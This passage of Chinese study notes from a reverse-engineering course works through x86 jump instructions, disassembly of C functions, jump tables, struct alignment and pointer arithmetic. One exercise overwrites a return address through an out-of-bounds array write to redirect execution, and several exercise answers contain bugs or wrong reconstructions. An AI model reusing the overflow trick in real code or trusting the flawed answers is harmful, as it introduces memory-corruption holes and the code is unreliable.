ecx,eax jp 0x4010B2 6、\tJNP, JPO 结果中1的个数为偶数则跳转\tPF=0 mov eax,0x101 mov ecx,0x100 cmp eax,ecx jpo 0x40101C 7、\tJO 结果溢出了则跳转\tOF=1 8、\tJNO 结果没有溢出则跳转\tOF=0 9、\tJB, JNAE 小于则跳转 (无符号数)\tCF=1 10、\tJNB, JAE 大于等于则跳转 (无符号数)\tCF=0 11、\tJBE, JNA 小于等于则跳转 (无符号数)\tCF=1 or ZF=1 12、\tJNBE, JA 大于则跳转(无符号数)\tCF=0 and ZF=0 13、\tJL, JNGE 小于则跳转 (有符号数)\tSF≠ OF 14、\tJNL, JGE 大于等于则跳转 (有符号数)\tSF=OF 15、\tJLE, JNG 小于等于则跳转 (有符号数)\tZF=1 or SF≠ OF 16、\tJNLE, JG 大于则跳转(有符号数)\tZF=0 and SF=OF 堆栈图 0x401174\n0x401182\n0x40118E\nc 编写一个函数能够对任意2个整数实现加法,并分析函数的反汇编\nint Plus1(int x,int y) { return x+y; } 0000000000001129 \u003cPlus1\u003e: 1129:\tf3 0f 1e fa endbr64 112d:\t55 push rbp 112e:\t48 89 e5 mov rbp,rsp 1131:\t89 7d fc mov DWORD PTR [rbp-0x4],edi ;第一个参数 1134:\t89 75 f8 mov DWORD PTR [rbp-0x8],esi ;第二个参数 1137:\t8b 55 fc mov edx,DWORD PTR [rbp-0x4] 113a:\t8b 45 f8 mov eax,DWORD PTR [rbp-0x8] 113d:\t01 d0 add eax,edx ;操作过程 113f:\t5d pop rbp 1140:\tc3 ret 编写一个函数，能够对任意3个整数实现加法,并分析函数的反汇编\nint Plus2(int x,int y,int z) { return x+y+z; } 0000000000001129 \u003cPlus2\u003e: 1129:\tf3 0f 1e fa endbr64 112d:\t55 push rbp 112e:\t48 89 e5 mov rbp,rsp 1131:\t89 7d fc mov DWORD PTR [rbp-0x4],edi ;第一个参数 1134:\t89 75 f8 mov DWORD PTR [rbp-0x8],esi ;第二个参数 1137:\t89 55 f4 mov DWORD PTR [rbp-0xc],edx ;第三个参数 113a:\t8b 55 fc mov edx,DWORD PTR [rbp-0x4] 113d:\t8b 45 f8 mov eax,DWORD PTR [rbp-0x8] 1140:\t01 c2 add edx,eax ;是前两个参数先相加 1142:\t8b 45 f4 mov eax,DWORD PTR [rbp-0xc] 1145:\t01 d0 add eax,edx ;之后与第四个参数相加 1147:\t5d pop rbp 1148:\tc3 ret 编写一个函数，能够实现对任意5个整数实现加法（使用Plus1和Plus2）并分析一个函数的反汇编代码\nint Plus3(int a,int b,int c,int d,int e) { return Plus2(a,b,c)+Plus1(d,e); } 0000000000001161 \u003cPlus3\u003e: 1161:\tf3 0f 1e fa endbr64 1165:\t55 push rbp 1166:\t48 89 e5 mov rbp,rsp 1169:\t53 push rbx 116a:\t48 83 ec 18 sub rsp,0x18 116e:\t89 7d f4 mov DWORD PTR [rbp-0xc],edi 1171:\t89 75 f0 mov DWORD PTR [rbp-0x10],esi 1174:\t89 55 ec mov DWORD PTR [rbp-0x14],edx 1177:\t89 4d e8 mov DWORD PTR [rbp-0x18],ecx 117a:\t44 89 45 e4 mov DWORD PTR [rbp-0x1c],r8d 117e:\t8b 55 ec mov edx,DWORD PTR [rbp-0x14] ;参数3 1181:\t8b 4d f0 mov ecx,DWORD PTR [rbp-0x10] ;参数2 1184:\t8b 45 f4 mov eax,DWORD PTR [rbp-0xc] ;参数1 1187:\t89 ce mov esi,ecx 1189:\t89 c7 mov edi,eax 118b:\te8 b1 ff ff ff call 1141 \u003cPlus2\u003e ;调用函数 1190:\t89 c3 mov ebx,eax 1192:\t8b 55 e4 mov edx,DWORD PTR [rbp-0x1c] 1195:\t8b 45 e8 mov eax,DWORD PTR [rbp-0x18] 1198:\t89 d6 mov esi,edx ;参数1 119a:\t89 c7 mov edi,eax ;参数2 119c:\te8 88 ff ff ff call 1129 \u003cPlus1\u003e ;调用函数 11a1:\t01 d8 add eax,ebx 11a3:\t48 8b 5d f8 mov rbx,QWORD PTR [rbp-0x8] 11a7:\tc9 leave 11a8:\tc3 ret 数据类型 定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r，使用if..else..分支语句，将最大的值存储到g_r中\nint g_x = 5; int g_y = 4; int g_z = 7; int g_r = 0; void Max() { if (g_x \u003e= g_y \u0026\u0026 g_x \u003e= g_z) { g_r = g_x; // g_x 最大 } else if (g_y \u003e= g_x \u0026\u0026 g_y \u003e= g_z) { g_r = g_y; // g_y 最大 } else { g_r = g_z; // g_z 最大 } } 找出数组里面最大的值，并存储到全局变量中（if..esle）\nint arr[4] = {2,5,7,9}; int g_r; void ArrMax() { if (arr[0] \u003e= arr[1] \u0026\u0026 arr[0] \u003e= arr[2] \u0026\u0026 arr[0]\u003e=arr[3]) { g_r = arr[0]; // arr[0] 最大 } else if (arr[1] \u003e= arr[0] \u0026\u0026 arr[1] \u003e= arr[2] \u0026\u0026 arr[1]\u003e=arr[3]) { g_r = arr[1]; // arr[1] 最大 } else if (arr[2] \u003e= arr[0] \u0026\u0026 arr[2] \u003e= arr[1] \u0026\u0026 arr[2]\u003e=arr[3]) { g_r = arr[2]; // arr[2] 最大 } else{ g_r = arr[3]; // arr[3] 最大 } } 将数组所有的元素相加，将结果存储到g_r中\nint arr[10] = {2,5,7,9,22,4,8,22,3,18}; int g_r; void ArrMax() { for (int i = 0; i \u003c 10; i++) { g_r += arr[i]; } } 俩俩比较数组的值，将最大的一个存储到数组的最后一个位置（要求使用for循环实现）\nint arr[10] = {2,7,5,9,22,4,8,22,3,18}; int g_r; void ArrMax() { for (int i = 0; i \u003c 10; i++) { if(g_r \u003c= arr[i]){ g_r = arr[i]; } } arr[9] = g_r; } 有一个字符串是这样的：china中国verygood天朝nice，里面既含有中文又含义英文，请编写一个函数，能截取任意长度的字符串n（n\u003c=总长度）\nchar* fn(int n) { const char* str = \"china中国verygood天朝nice\"; int len = strlen(str); // 获取字符串的总长度 int count = 0; // 用于计数有效字符数 int i; // 为输出字符串分配足够的内存 char* output = (char*)malloc((n + 1) * sizeof(char)); if (output == NULL) { return NULL; // 内存分配失败 } // 遍历原始字符串 for (i = 0; i \u003c len \u0026\u0026 count \u003c n; i++) { // 判断当前字符是否为中文 if ((str[i] \u0026 0x80) != 0) { // 如果高位为1，则为中文字符 // 中文字符占用两个字节 if (count + 1 \u003c n) { output[count++] = str[i++]; output[count++] = str[i]; // 复制中文字符的第二个字节 } } else { // 英文字符占用一个字节 output[count++] = str[i]; } } // 确保输出字符串以'\\0'结尾 output[count] = '\\0'; return output; // 返回输出字符串 } if 00401030 push ebp\t00401031 mov ebp,esp 00401033 sub esp,44h\t00401036 push ebx\t00401037 push esi\t00401038 push edi 00401039 lea edi,[ebp-44h]\t0040103C mov ecx,11h\t00401041 mov eax,0CCCCCCCCh\t00401046 rep stos dword ptr [edi]\t00401048 mov eax,[004225c4] 0040104D mov dword ptr [ebp-4],eax\t00401050 mov ecx,dword ptr [ebp+8]\t00401053 cmp ecx,dword ptr [ebp+0Ch]\t00401056 jg 00401064\t00401058 mov edx,dword ptr [ebp+0Ch] 0040105B add edx,dword ptr [ebp-4]\t0040105E mov dword ptr [004225c4],edx\t00401064 pop edi\t00401065 pop esi 00401066 pop ebx\t00401067 mov esp,ebp\t00401069 pop ebp\t0040106A ret 函数内部功能分析：\n分析参数\n[ebp+8]:X [ebp+0Ch]:Y 分析局部变量\n[ebp-4]=A=[004225c4] 分析全局变量\n[004225c4] = G 返回值分析\n无\n还原成C函数\nint A = G; if (X \u003c= Y) { G=Y+A; } return G; 004010B0 push ebp 004010B1 mov ebp,esp 004010B3 sub esp,48h 004010B6 push ebx 004010B7 push esi 004010B8 push edi 004010B9 lea edi,[ebp-48h] 004010BC mov ecx,12h 004010C1 mov eax,0CCCCCCCCh 004010C6 rep stos dword ptr [edi] 004010C8 mov eax,[004225c4] 004010CD mov dword ptr [ebp-4],eax 004010D0 mov dword ptr [ebp-8],2 004010D7 mov ecx,dword ptr [ebp+8] 004010DA cmp ecx,dword ptr [ebp+0Ch] 004010DD jl 004010e8 004010DF mov edx,dword ptr [ebp-8] 004010E2 add edx,1 004010E5 mov dword ptr [ebp-8],edx 004010E8 mov eax,dword ptr [ebp+8] 004010EB cmp eax,dword ptr [ebp+0Ch] 004010EE jge 004010fb 004010F0 mov ecx,dword ptr [ebp-8] 004010F3 mov dword ptr [004225c4],ecx 004010F9 jmp 00401107 004010FB mov edx,dword ptr [ebp-4] 004010FE add edx,dword ptr [ebp-8] 00401101 mov dword ptr [004225c4],edx 00401107 pop edi 00401108 pop esi 00401109 pop ebx 0040110A mov esp,ebp 0040110C pop ebp 0040110D ret 函数内部功能分析：\n分析参数\n[ebp+8]:X [ebp+0Ch]:Y 分析局部变量\n[ebp-4]=A=[004225c4] [ebp-8]=B=2 分析全局变量\n[004225c4] = G 返回值分析\n无\n还原成C函数\nint A = G; int B = 2; if(X \u003e= Y) { B=B+2; }else if(X \u003e Y) { G=B; }else { G=A+B; } return G; 004010B0 push ebp 004010B1 mov ebp,esp\t004010B3 sub esp,4Ch 004010B6 push ebx\t004010B7 push esi\t004010B8 push edi\t004010B9 lea edi,[ebp-4Ch] 004010BC mov ecx,13h\t004010C1 mov eax,0CCCCCCCCh\t004010C6 rep stos dword ptr [edi]\t;init 004010C8 mov dword ptr [ebp-4],0\t004010CF mov dword ptr [ebp-8],1 004010D6 mov dword ptr [ebp-0Ch],2\t004010DD mov eax,dword ptr [ebp+8]\t004010E0 cmp eax,dword ptr [ebp+0Ch]\t;x \u003c y 004010E3 jg 004010f0\t004010E5 mov ecx,dword ptr [ebp-8] 004010E8 sub ecx,1\t004010EB mov dword ptr [ebp-4],ecx\t004010EE jmp 00401123\t004010F0 mov edx,dword ptr [ebp+0Ch] 004010F3 cmp edx,dword ptr [ebp+10h]\t;Y \u003e= Z 004010F6 jl 00401103\t004010F8 mov eax,dword ptr [ebp-0Ch]\t004010FB add eax,1 004010FE mov dword ptr [ebp-4],eax\t00401101 jmp 00401123\t00401103 mov ecx,dword ptr [ebp+8]\t00401106 cmp ecx,dword ptr [ebp+10h]\t00401109 jle 00401116\t;X \u003e Z 0040110B mov edx,dword ptr [ebp-8]\t0040110E add edx,dword ptr [ebp-0Ch]\t00401111 mov dword ptr [ebp-4],edx\t00401114 jmp 00401123\t00401116 mov eax,dword ptr [ebp-0Ch]\t00401119 mov ecx,dword ptr [ebp-8]\t0040111C lea edx,[ecx+eax-1]\t00401120 mov dword ptr [ebp-4],edx\t00401123 mov eax,dword ptr [ebp-4]\t00401126 add eax,1\t00401129 pop edi\t0040112A pop esi\t0040112B pop ebx\t0040112C mov esp,ebp\t0040112E pop ebp\t0040112F ret\t函数内部功能分析：\n分析参数\n[ebp+8]:X [ebp+0Ch]:Y [ebp+10h]:Z 分析局部变量\n[ebp-4]=A=0 [ebp-8]=B=1 [ebp-0Ch]=C=2 分析全局变量\n无\n返回值分析\n无\n还原成C函数\nint A = 0; int B = 1; int C = 2; if(x \u003c y) { A=B-1; }else if(Y \u003e= Z) { A=C+1; }else if(X \u003e Z) { A=B+C; }else{ A=C+B+1; } A++; return A; 正向base #include \u003cstdio.h\u003e void HelloWord()\t{\tprintf(\"Hello World\");\tgetchar();\t}\tvoid Fun()\t{\tint arr[5] = {1,2,3,4,5};\tarr[6] = (int)HelloWord;\t//------------------------------------------------ } void main() { Fun(); } 跟进代码中标识的那一行，观察栈如下：\nFun() line 12 main() line 19 mainCRTStartup() line 206 + 25 bytes KERNEL32! 768b5d49() APP01! 772ccebb() APP01! 772cce41() 单步执行后的栈如下：\nFun() line 14 1! @ILT+0(_HelloWord) address 0x00401005 mainCRTStartup() line 206 + 25 bytes KERNEL32! 768b5d49() APP01! 772ccebb() APP01! 772cce41() 可以发现这是将函数的返回地址修改了，所以可以调用HelloWord函数。\n#include \u003cstdio.h\u003e void Fun()\t{\tint i;\tint arr[5] = {0};\tfor(i=0;i\u003c=5;i++)\t{\tarr[i] = 0;\t//--------------------------------------------------- printf(\"Hello World!\\n\");\t}\t}\tvoid main() { Fun(); } 函数在执行到代码中标识的那一行时，如果循环到第5次时会发生数组越界，在IDA的堆栈视图中可以清楚的看到：\n-000000000000001A db ? ; undefined -0000000000000019 db ? ; undefined -0000000000000018 arr[0] dd ? -0000000000000014 arr[1] dd ? -0000000000000010 arr[2] dd ? -000000000000000C arr[3] dd ? -0000000000000008 arr[4] dd ? -0000000000000004 i dd ?//arr[5] +0000000000000000 s db 4 dup(?) +0000000000000004 r db 4 dup(?) +0000000000000008 +0000000000000008 ; end of stack variables 重命名之后当i=5时arr[5] = 0会清空i的值，所以会出现无限循环。\n循环语句 判断数组是否是对称的，如果是返回1，不是返回0\n#include \u003cstdio.h\u003e int arr[5] = {1,2,3,4,5}; int check() { int i = 0; int mid=0; int count = sizeof(arr) / sizeof(arr[0]); mid = count/2; while(i\u003cmid) { if(arr[i]!=arr[count-1]) { return 0; } i++; count--; } return 1; } int main() { int x = check(); printf(\"%d\\n\",x); } 编写程序实现一个冒泡排序的算法\n#include \u003cstdio.h\u003e int arr[10] = {16, 8, 2, 5, 7, 9, 0, 1, 6, 3}; void order() { int count = sizeof(arr) / sizeof(arr[0]); int temp; for (int i = 0; i \u003c count - 1; i++) { for (int j = 0; j \u003c count - 1 - i; j++) { if (arr[j] \u003e arr[j + 1]) { temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } } } int main() { order(); for (int i = 0; i \u003c 10; i++) { printf(\"%d\\n\", arr[i]); } return 0; } 参数-返回值-数组 返回值超过32位时，存在哪里？用long long(__int64)类型做实验\nlong long类型在VC6中对应的是__int64\n__int64 Function() { __int64 x = 0x1234567890; return x; } 查看反汇编可以看到，当返回值超过32位时，会使用多个寄存器将结果返回：\n6: __int64 x = 0x1234567890; 00401038 mov dword ptr [ebp-8],34567890h 0040103F mov dword ptr [ebp-4],12h 7: return x; 00401046 mov eax,dword ptr [ebp-8] 00401049 mov edx,dword ptr [ebp-4] char arr[3] = {1,2,3};与 char arr[4] = {1,2,3,4};哪个更节省空间，从反汇编的角度来说明你的观点\n根据反汇编，其实都是一个地址空间存储了一个数字：\n8: char arr0[3] = {1,2,3}; 00401028 mov byte ptr [ebp-4],1 0040102C mov byte ptr [ebp-3],2 00401030 mov byte ptr [ebp-2],3 9: char arr1[4] = {1,2,3,4}; 00401034 mov byte ptr [ebp-8],1 00401038 mov byte ptr [ebp-7],2 0040103C mov byte ptr [ebp-6],3 00401040 mov byte ptr [ebp-5],4 不过观察内存可以发现，在地址0x19FF2F处被对齐了，也就是被浪费了：\n0019FF28 01 02 03 04 01 02 03 ....... 0019FF2F CC 70 FF 19 00 49 11 蘰...I. 0019FF36 40 00 01 00 00 00 A8 @...... 找出下面赋值过程的反汇编代码\nvoid Function() { int x = 1; int y = 2; int r; int arr[10] = {1,2,3,4,5,6,7,8,9,10}; r = arr[1]; r = arr[x]; r = arr[x+y]; r = arr[x*2+y]; } 抬栈的是00401023 sub esp,74h，因为需要存13个参数，每个参数大小为4，所以为13*4=34h，加上要分配的40h，就是74h了。\n10: r = arr[1]; 0040108C mov eax,dword ptr [ebp-30h] 0040108F mov dword ptr [ebp-0Ch],eax 11: r = arr[x]; 00401092 mov ecx,dword ptr [ebp-4] 00401095 mov edx,dword ptr [ebp+ecx*4-34h] ;ecx*4相当于数组向后索引的偏移 00401099 mov dword ptr [ebp-0Ch],edx 12: r = arr[x+y]; 0040109C mov eax,dword ptr [ebp-4] 0040109F add eax,dword ptr [ebp-8] 004010A2 mov ecx,dword ptr [ebp+eax*4-34h] 004010A6 mov dword ptr [ebp-0Ch],ecx 13: r = arr[x*2+y]; 004010A9 mov edx,dword ptr [ebp-4] 004010AC mov eax,dword ptr [ebp-8] 004010AF lea ecx,[eax+edx*2] 004010B2 mov edx,dword ptr [ebp+ecx*4-34h] 004010B6 mov dword ptr [ebp-0Ch],edx 14: } 桶排序\n#include \u003cstdio.h\u003e int arr[10] = {1,5,3,8,6,3,7,2,6,3}; int ret[10] = {0}; int order() { int count = sizeof(arr) / sizeof(arr[0]); int t; int j=0; int i=0; for(;i \u003c count;i++){ ret[arr[i]]++; } for(;j \u003c count;j++){ if(ret[j]\u003e0) { t=ret[j]; while(t\u003e0) { printf(\"%d \",j); t--; } } } } void main() { order(); } 多维数组 假设现在有5个班，每个班10个人，设计一个二维数组存储这些人的年龄\nint arr[5][10] = {0}; int i = 0; int j = 0; for(;i\u003c5;i++) { for(;j\u003c10;j++) { printf(\"[%d][%d]:\",i+1,j+1); scanf(\"%d\",arr[i][j]); } } 如果想知道第二个班的第6个人的年龄，应该如何获取？编译器该如何获取？\nint memb = 0; memb = arr[1][5]; ===================================================================== arr[1*10+5*1] 打印所有班级，所有学生的年龄（每个班级打印一行）\nint i = 0; int j = 0; for(;i\u003c5;i++) { for(;j\u003c10;j++) { printf(\"[%d][%d]:%d \",i+1,j+1,arr[i][j]); } printf(\"\\n\"); } 将第二个班级的超过20岁的学生的年龄修改为21岁\nint j = 0; for(;j\u003c10;j++) { if(arr[1][j]\u003e20) { arr[1][j]=21; } } 打印出每个班级学生的年龄的和\nint i = 0; int j = 0; int fin = 0; for(;i\u003c5;i++) { fin=0; for(;j\u003c10;j++) { fin+=arr[i][j]; } printf(\"%d:%d\\n\",i+1,fin); } 数组一：[3,5,7,9,12,25,34,55]\n数组二：[4,7,9,11,13,16]\n将两个数组中所有数据进行从小到大的排序，存储到另一个数组中\nint arr1[8] = [3,5,7,9,12,25,34,55]; int arr2[6] = [4,7,9,11,13,16]; int ret[14] = {0}; int i = 0; int j = 0; int k = 0; while(i\u003c8) { while(j\u003c6) { if(arr1[i]\u003carr2[j]) { ret[k] = arr1[i]; k++; break; } else{ ret[k] = arr2[j]; k++; } j++; } i++; } //应该是这样吧 结构体 定义一个结构体Gamer用来存储一个游戏中的角色的信息，包括血值、等级、坐标等信息\n要求：\n具体包含哪些信息自由设计 但这些包含的类型中，必须要有一个成员是结构体类型 struct feature { int i } struct Gamer { short blood; short grade; int x; int y; feature fea } 定义一个函数，用来给这个结构体变量赋值\nvoid function() { Gamer.blood = 100; Gamer.grade = 1; Gamer.x = 1000; Gamer.y = 1000; Gamer.fea.i = 0; } 定义一个函数，用来显示这个结构体变量的所有成员信息\nvoid function() { printf(\"%d\",Gamer.blood); printf(\"%d\",Gamer.grade); printf(\"%d\",Gamer.x); printf(\"%d\",Gamer.y); printf(\"%d\",Gamer.feature.i); } 结构体数组 定义一个结构体Monster，能够存储怪的各种信息（至少有一个成员是结构体类型）\nstruct S1\t{\tchar c;\tdouble i;\t}; struct Monster\t{\tint ID;\tdouble blood; int x; int y; S1 s; }; 声明一个Monster类型的数组，长度为10\nMonster arr[10]; 编写一个函数，为第二题中的数组赋值\nvoid fun1() { arr[0].ID = 1145; arr[0].blood = 1000; arr[0].x = 100; arr[0].y = 10; arr[0].s.c = 1; arr[0].s.i = 90; } 编写一个函数，能够通过怪物ID，打印当前这个怪物的所有信息\nint i = 0; while(i\u003c10) { if(arr[i].ID==1145) { print(\"%d\\n\",arr[i].blood); print(\"%d\\n\",arr[i].x); print(\"%d\\n\",arr[i].y); print(\"%d\\n\",arr[i].s.c); print(\"%d\\n\",arr[i].s.i); } i++; } 分析下面结构体的内存分配：\nstruct S1\t{\tchar c;\tdouble i;\t}; struct S3\t{\tchar c1; S1 s; char c2; char c3; };\tstruct S4\t{\tchar c1; S1 s; char c2; double c3; };\tstruct S5\t{\tint c1; char c2[10]; };\tS1: c 0 0 0 i i i i S3: c1 0 0 0 c 0 0 0 i i i i c2 c3 0 0 S4: c1 0 0 0 c 0 0 0 i i i i c2 0 0 0 c3 c3 c3 c3 S5: c1 c1 0 0 c2 c2 c2 c2 c2 c2 c2 c2 c2 c2 0 0 //默认8对齐 Switch 写一个switch语句，不生产大表也不生产小表，贴出对应的反汇编\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { switch(x) { case 1: printf(\"1\\n\"); case 2: printf(\"2\\n\"); case 3: printf(\"3\\n\"); } } void main() { fun(2); } 6: switch(x) 7: { 00401038 mov eax,dword ptr [ebp+8] 0040103B mov dword ptr [ebp-4],eax 0040103E cmp dword ptr [ebp-4],1 00401042 je fun+32h (00401052) 00401044 cmp dword ptr [ebp-4],2 00401048 je fun+3Fh (0040105f) 0040104A cmp dword ptr [ebp-4],3 0040104E je fun+4Ch (0040106c) 00401050 jmp fun+59h (00401079) 8: case 1: 9: printf(\"1\\n\"); 00401052 push offset string \"1\\n\" (00422024) 00401057 call printf (004010f0) 0040105C add esp,4 10: case 2: 11: printf(\"2\\n\"); 0040105F push offset string \"2\\n\" (00422020) 00401064 call printf (004010f0) 00401069 add esp,4 12: case 3: 13: printf(\"3\\n\"); 0040106C push offset string \"3\\n\" (0042201c) 00401071 call printf (004010f0) 00401076 add esp,4 14: 15: } 16: } 写一个switch语句，只生成大表，贴出对应的反汇编\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { switch(x) { case 1: printf(\"1\\n\"); case 2: printf(\"2\\n\"); case 3: printf(\"3\\n\"); case 4: printf(\"4\\n\"); case 5: printf(\"5\\n\"); case 6: printf(\"6\\n\"); case 7: printf(\"7\\n\"); case 8: printf(\"8\\n\"); case 9: printf(\"9\\n\"); } } void main() { fun(2); } 6: switch(x) 7: { 00401038 mov eax,dword ptr [ebp+8] 0040103B mov dword ptr [ebp-4],eax 0040103E mov ecx,dword ptr [ebp-4] 00401041 sub ecx,1 00401044 mov dword ptr [ebp-4],ecx 00401047 cmp dword ptr [ebp-4],8 0040104B ja $L622+0Dh (004010cc) 0040104D mov edx,dword ptr [ebp-4] 00401050 jmp dword ptr [edx*4+4010DDh] 8: case 1: 9: printf(\"1\\n\"); 00401057 push offset string \"1\\n\" (0042203c) 0040105C call printf (00401180) 00401061 add esp,4 10: case 2: 11: printf(\"2\\n\"); 00401064 push offset string \"2\\n\" (00422038) 00401069 call printf (00401180) 0040106E add esp,4 12: case 3: 13: printf(\"3\\n\"); 00401071 push offset string \"3\\n\" (00422034) 00401076 call printf (00401180) 0040107B add esp,4 14: case 4: 15: printf(\"4\\n\"); 0040107E push offset string \"4\\n\" (00422030) 00401083 call printf (00401180) 00401088 add esp,4 16: case 5: 17: printf(\"5\\n\"); 0040108B push offset string \"5\\n\" (0042202c) 00401090 call printf (00401180) 00401095 add esp,4 18: case 6: 19: printf(\"6\\n\"); 00401098 push offset string \"6\\n\" (00422028) 0040109D call printf (00401180) 004010A2 add esp,4 20: case 7: 21: printf(\"7\\n\"); 004010A5 push offset string \"7\\n\" (00422024) 004010AA call printf (00401180) 004010AF add esp,4 22: case 8: 23: printf(\"8\\n\"); 004010B2 push offset string \"8\\n\" (00422020) 004010B7 call printf (00401180) 004010BC add esp,4 24: case 9: 25: printf(\"9\\n\"); 004010BF push offset string \"9\\n\" (0042201c) 004010C4 call printf (00401180) 004010C9 add esp,4 26: } 27: } 004010DD 57 10 40 00 W.@. ;1 004010E1 64 10 40 00 d.@. ;2 004010E5 71 10 40 00 q.@. ;3 004010E9 7E 10 40 00 ~.@. ;4 004010ED 8B 10 40 00 ..@. ;5 004010F1 98 10 40 00 ..@. ;6 004010F5 A5 10 40 00 ..@. ;7 004010F9 B2 10 40 00 ..@. ;8 004010FD BF 10 40 00 ..@. ;9 写一个switch语句，生成大表和小表，贴出对应的反汇编\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { switch(x) { case 1: printf(\"1\\n\"); break; case 2: printf(\"2\\n\"); break; case 50: printf(\"50\\n\"); break; case 60: printf(\"60\\n\"); break; } } void main() { fun(2); } 6: switch(x) 7: { 00401038 mov eax,dword ptr [ebp+8] 0040103B mov dword ptr [ebp-4],eax 0040103E mov ecx,dword ptr [ebp-4] 00401041 sub ecx,1 00401044 mov dword ptr [ebp-4],ecx 00401047 cmp dword ptr [ebp-4],3Bh 0040104B ja $L612+0Dh (00401099) 0040104D mov eax,dword ptr [ebp-4] 00401050 xor edx,edx 00401052 mov dl,byte ptr (004010be)[eax] 00401058 jmp dword ptr [edx*4+4010AAh] 8: case 1: 9: printf(\"1\\n\"); 0040105F push offset string \"1\\n\" (00422028) 00401064 call printf (00401170) 00401069 add esp,4 10: break; 0040106C jmp $L612+0Dh (00401099) 11: case 2: 12: printf(\"2\\n\"); 0040106E push offset string \"2\\n\" (00422024) 00401073 call printf (00401170) 00401078 add esp,4 13: break; 0040107B jmp $L612+0Dh (00401099) 14: case 50: 15: printf(\"50\\n\"); 0040107D push offset string \"50\\n\" (00422020) 00401082 call printf (00401170) 00401087 add esp,4 16: break; 0040108A jmp $L612+0Dh (00401099) 17: case 60: 18: printf(\"60\\n\"); 0040108C push offset string \"60\\n\" (0042201c) 00401091 call printf (00401170) 00401096 add esp,4 19: break; 20: } 21: } 004010AA 5F 10 40 00 _.@. 004010AE 6E 10 40 00 n.@. 004010B2 7D 10 40 00 }.@. 004010B6 8C 10 40 00 ..@. 004010BA 99 10 40 00 ..@. 004010BE 00 01 04 04 .... 004010C2 04 04 04 04 .... 004010C6 04 04 04 04 .... 004010CA 04 04 04 04 .... 004010CE 04 04 04 04 .... 004010D2 04 04 04 04 .... 004010D6 04 04 04 04 .... 004010DA 04 04 04 04 .... 004010DE 04 04 04 04 .... 004010E2 04 04 04 04 .... 004010E6 04 04 04 04 .... 004010EA 04 04 04 04 .... 004010EE 04 02 04 04 .... 004010F2 04 04 04 04 .... 004010F6 04 04 04 03 .... 为do..while语句生成的反汇编填写注释\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { do { x++; } while(x\u003e20); } void main() { fun(2); } 6: do 7: { 8: x++; 00401038 mov eax,dword ptr [ebp+8];将参数传给eax 0040103B add eax,1 0040103E mov dword ptr [ebp+8],eax;x++操作 9: } 10: while(x\u003e20); 00401041 cmp dword ptr [ebp+8],14h;参数与14h=20比较 00401045 jg fun+18h (00401038);大于就跳转，就是跳出了 11: } 为while语句生成的反汇编填写注释\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { while(x\u003c20) { printf(\"%d\\n\",x); x++; } } void main() { fun(2); } 6: 7: while(x\u003e20) 00401038 cmp dword ptr [ebp+8],14h;首先与20进行比较 0040103C jge fun+3Ah (0040105a);大于等于就跳转，相当于跳出循环 8: { 9: printf(\"%d\\n\",x); 0040103E mov eax,dword ptr [ebp+8] 00401041 push eax 00401042 push offset string \"%d\\n\" (0042201c) 00401047 call printf (004010c0) 0040104C add esp,8;将参数打印的操作 10: x++; 0040104F mov ecx,dword ptr [ebp+8] 00401052 add ecx,1 00401055 mov dword ptr [ebp+8],ecx;将参数自增1的操作 11: } 00401058 jmp fun+18h (00401038);回到循环的开始 12: } 为for语句生成的反汇编填写注释\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { int i = 0; for(;i\u003c20;i++) { printf(\"%d\\n\",x); x++; } } void main() { fun(2); } 7: for(;i\u003e20;i++) 0040103F jmp fun+2Ah (0040104a) 00401041 mov eax,dword ptr [ebp-4] 00401044 add eax,1;i++操作 00401047 mov dword ptr [ebp-4],eax 0040104A cmp dword ptr [ebp-4],14h;首次开始执行的地方 0040104E jge fun+4Ch (0040106c);大于等于就跳转，相当于跳出循环了 8: { 9: printf(\"%d\\n\",x); 00401050 mov ecx,dword ptr [ebp+8] 00401053 push ecx 00401054 push offset string \"%d\\n\" (0042201c) 00401059 call printf (004010e0) 0040105E add esp,8;自己定义的打印操作 10: x++; 00401061 mov edx,dword ptr [ebp+8] 00401064 add edx,1 00401067 mov dword ptr [ebp+8],edx;x++操作 11: } 0040106A jmp fun+21h (00401041);跳到i++的地方了 12: } 指针 char类型占几字节？char*类型占几字节？int*****占几字节？\nchar占1个字节，char*占4个字节，int*****占4个字节 char** arr[10]占多少个字节？\n前面char**是4个字节，后面有10项，所以是40个字节 自定义结构体如下：\nstruct Student { int x; int y; }; 第一步：\nStudent**** s; s = (Student****)100; s++;\t//s的值是多少？\t104 s = s+2;\t//s的值是多少？\t112 s = s-3;\t//s的值是多少？\t100 第二步：\nStudent**** s1;\tStudent**** s2;\tint x;\ts1 = (Student****)200;\ts2 = (Student****)100;\tx = s1-s2;\t//x的值是多少？\t25 第三步：\nStudent* s;\ts = (Student*)100;\ts++;\t//s的值是多少？\t108 s = s+2;\t//s的值是多少？\t124 s = s-3;\t//s的值是多少？\t100 第四步：\nStudent* s1;\tStudent* s2;\tint x;\ts1 = (Student*)200;\ts2 = (Student*)100;\tx = s1-s2;\t//x的值是多少？\t12 列出每一行的反汇编代码：\nchar a = 10;\tshort b = 20;\tint c = 30;\tchar* pa = \u0026a;\tshort* pb = \u0026b;\tint* pc = \u0026c;\tchar** ppa = \u0026pa;\tshort** ppb = \u0026pb;\tint** ppc = \u0026pc;\t12: char* pa = \u0026a; 00401039 lea eax,[ebp-4] 0040103C mov dword ptr [ebp-10h],eax 13: short* pb = \u0026b; 0040103F lea ecx,[ebp-8] 00401042 mov dword ptr [ebp-14h],ecx 14: int* pc = \u0026c; 00401045 lea edx,[ebp-0Ch] 00401048 mov dword ptr [ebp-18h],edx 15: 16: 17: 18: char** ppa = \u0026pa; 0040104B lea eax,[ebp-10h] 0040104E mov dword ptr [ebp-1Ch],eax 19: short** ppb = \u0026pb; 00401051 lea ecx,[ebp-14h] 00401054 mov dword ptr [ebp-20h],ecx 20: int** ppc = \u0026pc; 00401057 lea edx,[ebp-18h] 0040105A mov dword ptr [ebp-24h],edx 列出每一行的反汇编代码：\nint p = 10;\tint******* p7;\tint****** p6;\tint***** p5;\tint**** p4;\tint*** p3;\tint** p2;\tint* p1;\tp1 = \u0026p;\tp2 = \u0026p1;\tp3 = \u0026p2;\tp4 = 